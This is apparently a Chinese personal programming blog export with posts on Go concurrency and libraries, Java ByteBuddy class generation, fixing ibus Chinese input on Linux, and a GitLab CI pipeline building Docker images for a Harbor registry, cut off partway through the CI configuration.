<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="comment">//无缓存的channel不存在发送和接收数据</span></span><br><span class="line"><span class="comment">// chan&lt;- string是只发送的channel</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">send</span><span class="params">(ch <span class="keyword">chan</span>&lt;- <span class="keyword">string</span>, message <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Sending: %#v\n&quot;</span>, message)</span><br><span class="line">    ch &lt;- message</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//&lt;-chan是只接收的channel</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">read</span><span class="params">(ch &lt;-<span class="keyword">chan</span> <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Receiving: %#v\n&quot;</span>, &lt;-ch)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, <span class="number">1</span>)</span><br><span class="line">    send(ch, <span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">    read(ch)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h4><p>最后，让我们讨论一个关于如何在使用 <code>select</code> 关键字的同时与多个 channel 交互的简短主题。 有时，在使用多个 channel 时，需要等待事件发生。 例如，当程序正在处理的数据中出现异常时，可以包含一些逻辑来取消操作。</p>
<p><code>select</code> 语句的工作方式类似于 <code>switch</code> 语句，但它适用于 channel。 它会阻止程序的执行，直到它收到要处理的事件。 如果它收到多个事件，则会随机选择一个。</p>
<p><code>select</code> 语句的一个重要方面是，它在处理事件后完成执行。 如果要等待更多事件发生，则可能需要使用循环。</p>
<p>让我们使用以下程序来看看 <code>select</code> 的运行情况：</p>
<p>Go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">process</span><span class="params">(ch <span class="keyword">chan</span> <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    time.Sleep(<span class="number">3</span> * time.Second)</span><br><span class="line">    ch &lt;- <span class="string">&quot;Done processing!&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">replicate</span><span class="params">(ch <span class="keyword">chan</span> <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">    ch &lt;- <span class="string">&quot;Done replicating!&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line">    ch2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line">    <span class="keyword">go</span> process(ch1)</span><br><span class="line">    <span class="keyword">go</span> replicate(ch2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> process := &lt;-ch1:</span><br><span class="line">            fmt.Println(process)</span><br><span class="line">        <span class="keyword">case</span> replicate := &lt;-ch2:</span><br><span class="line">            fmt.Println(replicate)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行程序时，将看到以下输出：</p>
<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Done replicating!</span><br><span class="line">Done processing!</span><br></pre></td></tr></table></figure>

<p>请注意，<code>replicate</code> 函数先完成。 这就是你在终端中先看到其输出的原因。 main 函数存在一个循环，因为 <code>select</code> 语句在收到事件后立即结束，但我们仍在等待 <code>process</code> 函数完成。</p>
<p>通过并发实现fib数列（一个有缓存channel）</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;math/rand&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fib</span><span class="params">(number <span class="keyword">float64</span>, ch <span class="keyword">chan</span> <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    x, y := <span class="number">1.0</span>, <span class="number">1.0</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="keyword">int</span>(number); i++ &#123;</span><br><span class="line">        <span class="comment">// x变成x+y，循环保证了只需要最后一个</span></span><br><span class="line">        x, y = y, x+y</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r := rand.Intn(<span class="number">3</span>)</span><br><span class="line">    time.Sleep(time.Duration(r) * time.Second)</span><br><span class="line"></span><br><span class="line">    ch &lt;- fmt.Sprintf(<span class="string">&quot;Fib(%v): %v\n&quot;</span>, number, x)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    start := time.Now()</span><br><span class="line"></span><br><span class="line">    size := <span class="number">15</span></span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; size; i++ &#123;</span><br><span class="line">        <span class="keyword">go</span> fib(<span class="keyword">float64</span>(i), ch)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; size; i++ &#123;</span><br><span class="line">        <span class="comment">//只能按照随机的顺序打印，因为不知道是哪个进程先完成的</span></span><br><span class="line">        fmt.Printf(&lt;-ch)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    elapsed := time.Since(start)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Done! It took %v seconds!\n&quot;</span>, elapsed.Seconds())</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>输入quit退出运算，不然进行fib的计算(两个无缓存channel)</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> quit = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fib</span><span class="params">(c <span class="keyword">chan</span> <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    x, y := <span class="number">1</span>, <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="keyword">case</span> c &lt;- x:</span><br><span class="line">                x, y = y, x+y</span><br><span class="line">            <span class="keyword">case</span> &lt;-quit:</span><br><span class="line">                fmt.Println(<span class="string">&quot;Done calculating Fibonacci!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    start := time.Now()</span><br><span class="line"></span><br><span class="line">    command := <span class="string">&quot;&quot;</span></span><br><span class="line">    data := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> fib(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        num := &lt;-data</span><br><span class="line">        fmt.Println(num)</span><br><span class="line">        fmt.Scanf(<span class="string">&quot;%s&quot;</span>, &amp;command)</span><br><span class="line">        <span class="keyword">if</span> command == <span class="string">&quot;quit&quot;</span> &#123;</span><br><span class="line">            quit &lt;- <span class="literal">true</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line"></span><br><span class="line">    elapsed := time.Since(start)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Done! It took %v seconds!\n&quot;</span>, elapsed.Seconds())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h4 id="sync-waitGroup并发"><a href="#sync-waitGroup并发" class="headerlink" title="sync.waitGroup并发"></a>sync.waitGroup并发</h4><p>实际使用中用的最多的还是这个并发方式，用起来很方便</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">	<span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="comment">//定义几个并发的协程</span></span><br><span class="line">	worker := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;, <span class="number">10</span>)</span><br><span class="line">	count, _ := GetTop10kCount()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> i <span class="keyword">int64</span></span><br><span class="line"><span class="comment">//列队中的并发任务</span></span><br><span class="line">	<span class="keyword">for</span> i = <span class="number">1</span>; i &lt; count; i++ &#123;</span><br><span class="line"></span><br><span class="line">		worker &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">		wg.Add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">		imaven := model.Imaven&#123;Id: i&#125;</span><br><span class="line">        <span class="comment">//创建一个匿名函数来执行并发</span></span><br><span class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(m model.Imaven)</span></span> &#123;</span><br><span class="line">			<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">                <span class="comment">//执行协程</span></span><br><span class="line">				&lt;-worker</span><br><span class="line">				wg.Done()</span><br><span class="line">			&#125;()</span><br><span class="line">			<span class="comment">//单个协程并并发的业务逻辑</span></span><br><span class="line">			_, err := global.Top10kEngine.Table(<span class="string">&quot;i_maven&quot;</span>).Get(&amp;imaven)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				<span class="built_in">panic</span>(err)</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//detect gav is exist,if exist do nothing,else write db</span></span><br><span class="line">			<span class="keyword">if</span> has, _ := global.Engine.Exist(&amp;model.Jarhash&#123;</span><br><span class="line">				GroupId:    imaven.GroupId,</span><br><span class="line">				ArtifactId: imaven.ArtifactId,</span><br><span class="line">				Version:    imaven.Version,</span><br><span class="line">			&#125;); has &#123;</span><br><span class="line">				fmt.Println(imaven.GroupId, imaven.ArtifactId, imaven.Version, <span class="string">&quot; is exists&quot;</span>)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				WriteJarHash2DB(global.Client.R(), imaven.GroupId, imaven.ArtifactId, imaven.Version)</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;(imaven)</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//如果达到十个就等待</span></span><br><span class="line">	wg.Wait()</span><br></pre></td></tr></table></figure>





<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>测试文件以<code>name_test.go</code>命名</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;testing&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestAccount</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>go test -v</code></p>
<p>检测是否通过测试</p>
<h2 id="第三方模块推荐"><a href="#第三方模块推荐" class="headerlink" title="第三方模块推荐"></a>第三方模块推荐</h2><h3 id="gin框架"><a href="#gin框架" class="headerlink" title="gin框架"></a>gin框架</h3><p><a href="https://geektutu.com/post/quick-go-gin.html">https://geektutu.com/post/quick-go-gin.html</a></p>
<p><a href="https://laravelacademy.org/post/21861">https://laravelacademy.org/post/21861</a></p>
<h3 id="xorm"><a href="#xorm" class="headerlink" title="xorm"></a>xorm</h3><p>文档:</p>
<p><a href="https://gitea.com/xorm/xorm/src/branch/master/README_CN.md">https://gitea.com/xorm/xorm/src/branch/master/README_CN.md</a></p>
<h3 id="gotoml"><a href="#gotoml" class="headerlink" title="gotoml"></a>gotoml</h3><p>用来读配置文件的第三方包</p>
<p>第三方包”github.com/pelletier/go-toml”</p>
<p>go get 一下然后import</p>
<p>假设有配置文件<code>config.toml</code></p>
<figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[db]</span></span><br><span class="line"><span class="attr">host</span> = <span class="string">&quot;localhost&quot;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// read the config.toml and set the value</span></span><br><span class="line">path, err := filepath.Abs(<span class="string">&quot;config.toml&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">   <span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">config, err := toml.LoadFile(path)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">   <span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> none <span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line">db_host := config.Get(<span class="string">&quot;db.host&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> v, ok := db_host.(<span class="keyword">string</span>); ok &#123;</span><br><span class="line">   dbHOST = v</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   none = <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if the config is not complete, panic the err</span></span><br><span class="line"><span class="keyword">if</span> none &#123;</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;the config is not complete&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="resty"><a href="#resty" class="headerlink" title="resty"></a>resty</h3><p>用于发送和处理http请求的</p>
<p><a href="https://github.com/go-resty/resty">https://github.com/go-resty/resty</a></p>
<h3 id="gjson"><a href="#gjson" class="headerlink" title="gjson"></a>gjson</h3><p>用于处理json数据的</p>
<p><a href="https://github.com/tidwall/gjson">https://github.com/tidwall/gjson</a></p>
]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>基础语法</tag>
        <tag>GO</tag>
      </tags>
  </entry>
  <entry>
    <title>java ByteBuddy</title>
    <url>/2021/11/24/java-ByteBuddy/</url>
    <content><![CDATA[<p>折腾了好久的javaagent不知为何就是不能在load类的时候进行其他类的执行，先放一放，了解一下ByteBuddy的使用</p>
<blockquote>
<p>Byte Buddy 是一个代码生成和操作库，用于在Java应用程序运行时创建和修改Java类，而无需编译器的帮助。除了Java类库附带的代码生成实用程序外，Byte Buddy还允许创建任意类，并且不限于实现用于创建运行时代理的接口。此外，Byte Buddy提供了一种方便的API，可以使用Java代理或在构建过程中手动更改类。</p>
</blockquote>
<p>比起javassist,asm,bcel起来都比较简单</p>
<p>个人理解就是为了解决Java静态语言的不方便之处，通过直接生成字节码然后使用JVM运行，和反射机制有点像，但是比反射机制效率更高，因为是生成字节码直接跑java虚拟机。</p>
<span id="more"></span>

<p>首先安装</p>
<p>maven的项目在pom.xml里面添加一个依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.bytebuddy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>byte-buddy<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.12.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>看看用法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.iast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.ByteBuddy;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.implementation.FixedValue;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.matcher.ElementMatchers;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * MyAgent</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAgent</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException </span>&#123;</span><br><span class="line">        Class&lt;?&gt; dynamicType = <span class="keyword">new</span> ByteBuddy().subclass(Object.class).method(ElementMatchers.named(<span class="string">&quot;toString&quot;</span>))</span><br><span class="line">                .intercept(FixedValue.value(<span class="string">&quot;Hello World&quot;</span>)).make().load(MyAgent.class.getClassLoader()).getLoaded();</span><br><span class="line"></span><br><span class="line">        Object instance = dynamicType.newInstance();</span><br><span class="line">        String toString = instance.toString();</span><br><span class="line">        System.out.println(toString);</span><br><span class="line">        System.out.println(instance.getClass().getCanonicalName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637745053102-2021-11-2417:10:53.png"></p>
<p>完成动态构造一个类并且输出他的</p>
<ul>
<li>subclass指定了新创建类的父类</li>
<li>method指定了Object的处理方法</li>
<li>intercept拦截了toString方法并返回指定的helllo world</li>
<li>最后make产生字节码，由类加载器加载到虚拟机中</li>
</ul>
<h3 id="创建类"><a href="#创建类" class="headerlink" title="创建类"></a>创建类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DynamicType.Unloaded&lt;?&gt; dynamicType = <span class="keyword">new</span> ByteBuddy()</span><br><span class="line">  .subclass(Object.class)</span><br><span class="line">  .make();</span><br></pre></td></tr></table></figure>

<p>创建一个类，还可以在make生成字节码之前<code>.name(&quot;your_name&quot;)</code>来进行命名</p>
<h3 id="加载类"><a href="#加载类" class="headerlink" title="加载类"></a>加载类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; type = <span class="keyword">new</span> ByteBuddy()</span><br><span class="line">  .subclass(Object.class)</span><br><span class="line">  .make()</span><br><span class="line">  .load(getClass().getClassLoader(), ClassLoadingStrategy.Default.WRAPPER)</span><br><span class="line">  .getLoaded();</span><br></pre></td></tr></table></figure>

<h3 id="redefine和rebase"><a href="#redefine和rebase" class="headerlink" title="redefine和rebase"></a>redefine和rebase</h3><p>redefine修改之后就会把原来的类功能冲掉，变得不可用</p>
<p>rebase只是加了个前缀而已</p>
<h3 id="重载类"><a href="#重载类" class="headerlink" title="重载类"></a>重载类</h3><p>相当于是和javaagent一样的功能，在类load的时候劫持并且运行我们自己的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">  <span class="function">String <span class="title">m</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;foo&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bar</span> </span>&#123;</span><br><span class="line">  <span class="function">String <span class="title">m</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;bar&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ByteBuddyAgent.install();</span><br><span class="line">Foo foo = <span class="keyword">new</span> Foo();</span><br><span class="line"><span class="keyword">new</span> ByteBuddy()</span><br><span class="line">  .redefine(Bar.class)</span><br><span class="line">  .name(Foo.class.getName())</span><br><span class="line">  .make()</span><br><span class="line">  .load(Foo.class.getClassLoader(), ClassReloadingStrategy.fromInstalledAgent());</span><br><span class="line">assertThat(foo.m(), is(<span class="string">&quot;bar&quot;</span>));    </span><br></pre></td></tr></table></figure>



<h3 id="方法拦截"><a href="#方法拦截" class="headerlink" title="方法拦截"></a>方法拦截</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Foo dynamicFoo = <span class="keyword">new</span> ByteBuddy()</span><br><span class="line">  .subclass(Foo.class)</span><br><span class="line">  <span class="comment">// 匹配由Foo.class声明的方法</span></span><br><span class="line">  .method(isDeclaredBy(Foo.class)).intercept(FixedValue.value(<span class="string">&quot;One!&quot;</span>))</span><br><span class="line">  <span class="comment">// 匹配名为foo的方法</span></span><br><span class="line">  .method(named(<span class="string">&quot;foo&quot;</span>)).intercept(FixedValue.value(<span class="string">&quot;Two!&quot;</span>))</span><br><span class="line">  <span class="comment">// 匹配名为foo，入参数量为1的方法</span></span><br><span class="line">  .method(named(<span class="string">&quot;foo&quot;</span>).and(takesArguments(<span class="number">1</span>))).intercept(FixedValue.value(<span class="string">&quot;Three!&quot;</span>))</span><br><span class="line">  .make()</span><br><span class="line">  .load(getClass().getClassLoader())</span><br><span class="line">  .getLoaded()</span><br><span class="line">  .newInstance();</span><br></pre></td></tr></table></figure>



<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://bytebuddy.net/#/tutorial">https://bytebuddy.net/#/tutorial</a></p>
]]></content>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>linux ibus架构输入法中文输入问题</title>
    <url>/2022/02/20/linux-ibus%E6%9E%B6%E6%9E%84%E8%BE%93%E5%85%A5%E6%B3%95%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>ubuntu默认的中文输入法为ibus架构的，jetbrain全家桶在输入中文的时候会有问题</p>
<p>但有的时候又懒得折腾rime输入法，好多软件默认的就是fcitx</p>
<span id="more"></span>

<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="jetbrain全家桶"><a href="#jetbrain全家桶" class="headerlink" title="jetbrain全家桶"></a>jetbrain全家桶</h3><p> 修改对应启动文件比如 idea.sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export XMODIFIERS=&quot;@im=ibus&quot;</span><br><span class="line">export GTK_IM_MODULE=&quot;ibus&quot;</span><br><span class="line">export QT_IM_MODULE=&quot;ibus&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>点击idea或者pycharm菜单 “Help | Edit Custom VM options…”</li>
<li>添加 -Drecreate.x11.input.method=true 到最后一行</li>
<li>重启IDEA</li>
</ul>
<h3 id="钉钉for-linux"><a href="#钉钉for-linux" class="headerlink" title="钉钉for linux"></a>钉钉for linux</h3><p><code>/opt/apps/com.alibabainc.dingtalk/files/Elevator.sh</code></p>
<p>修改fcitx为ibus</p>
<p>和原解决方案的作者路径不太一样，应该是钉钉更新之后修改了，思路其实都是一样的。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/libpinyin/ibus-libpinyin/issues/289">https://github.com/libpinyin/ibus-libpinyin/issues/289</a></p>
<p><a href="https://blog.csdn.net/weixin_43276139/article/details/120492441">https://blog.csdn.net/weixin_43276139/article/details/120492441</a></p>
]]></content>
      <tags>
        <tag>杂</tag>
      </tags>
  </entry>
  <entry>
    <title>gitlab-ci配合docker实现CICD</title>
    <url>/2022/02/20/gitlab-ci%E9%85%8D%E5%90%88docker%E5%AE%9E%E7%8E%B0CICD/</url>
    <content><![CDATA[<h1 id="CI-CD"><a href="#CI-CD" class="headerlink" title="CI/CD"></a>CI/CD</h1><p>之前一直不是很了解什么是CI/CD只是有一个模糊的印象，毕竟直译就是持续集成/持续部署,然后实际上接触之后就很有体会，所谓的cicd简单理解<strong>就是一种可以帮助你自动化构建项目部署</strong>的自动化工具流程，比如说go项目在编写完代码commit之后，cicd就可以根据你提交的最新的代码进行build成二进制，并且通过<strong>流水线</strong>的概念帮你完成一个又一个部署或者构建项目。</p>
<p>正好碰到了一个实际的需求，记录一下在gitlab下配合ci/cd的流程（以go项目为例）</p>
<span id="more"></span>

<h1 id="gitlab-runner-docker-CI-CD流程"><a href="#gitlab-runner-docker-CI-CD流程" class="headerlink" title="gitlab runner+docker CI/CD流程"></a>gitlab runner+docker CI/CD流程</h1><p>其实工程上业务需求一般的分为两种；</p>
<ol>
<li>自动构建二进制文件，然后打成docker镜像上传私有docker仓库</li>
<li>拉docker私有仓库已经存在的镜像，运行</li>
</ol>
<p>这篇文章写的很详细，不过用的是手动上传包到harbor（docker私有仓库的开源实现）的。</p>
<ul>
<li><strong>手动</strong>构建docker包上传harbor ,使用gitlab CI从harbor拉取镜像</li>
</ul>
<p><a href="https://blog.k8s.li/gitlab-ci-harbor.html">https://blog.k8s.li/gitlab-ci-harbor.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker login [harbor_host]</span><br><span class="line">docker push docker镜像至harbor</span><br></pre></td></tr></table></figure>



<p>而刚刚说的第一种业务场景模拟构建实现:</p>
<h2 id="流水线1-构建二进制脚本-打包成docker镜像上传harbor"><a href="#流水线1-构建二进制脚本-打包成docker镜像上传harbor" class="headerlink" title="流水线1:构建二进制脚本-打包成docker镜像上传harbor"></a>流水线1:构建二进制脚本-打包成docker镜像上传harbor</h2><p><code>.gitlab-ci.yml</code></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#构建golang的包并且做成docker镜像上传至harbor私库</span></span><br><span class="line"><span class="attr">stages:</span>          </span><br><span class="line">  <span class="bullet">-</span> <span class="string">build</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">docker</span></span><br><span class="line"></span><br><span class="line"><span class="attr">build:</span>       </span><br><span class="line">  <span class="attr">stage:</span> <span class="string">build</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">golang:alpine</span></span><br><span class="line">  <span class="attr">before_script:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">go</span> <span class="string">env</span> <span class="string">-w</span> <span class="string">GO111MODULE=on</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">go</span> <span class="string">env</span> <span class="string">-w</span> <span class="string">GOPROXY=https://goproxy.cn</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">  <span class="comment"># go build -o binaryFile sourcecCodeFile</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">go</span> <span class="string">build</span> <span class="string">-o</span> <span class="string">build/helloworld</span> <span class="string">main.go</span></span><br><span class="line">  <span class="attr">tags:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">dev</span></span><br><span class="line"></span><br><span class="line"><span class="attr">docker:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">docker</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">docker:latest</span></span><br><span class="line">  <span class="attr">variables:</span></span><br><span class="line">  <span class="comment"># 大写的作为变量用$符号引用</span></span><br><span class="line">      <span class="attr">DOCKER_TLS_CERTDIR:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">      <span class="attr">GIT_STRATEGY:</span> <span class="string">none</span></span><br><span class="line">      <span class="comment">#这里需要新建一个hello-world项目在harbor中</span></span><br><span class="line">      <span class="attr">REPO:</span> <span class="string">hello-world/hello-world</span></span><br><span class="line">  <span class="attr">services:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">docker:dind</span></span><br><span class="line">        <span class="attr">command:</span> [<span class="string">&quot;--registry-mirror&quot;</span>, <span class="string">&quot;https://xxxx.com&quot;</span>, <span class="string">&quot;--insecure-registry&quot;</span>, <span class="string">&quot;xxx.xxx.xxx.xxx:xxxx&quot;</span>]</span><br><span class="line">  <span 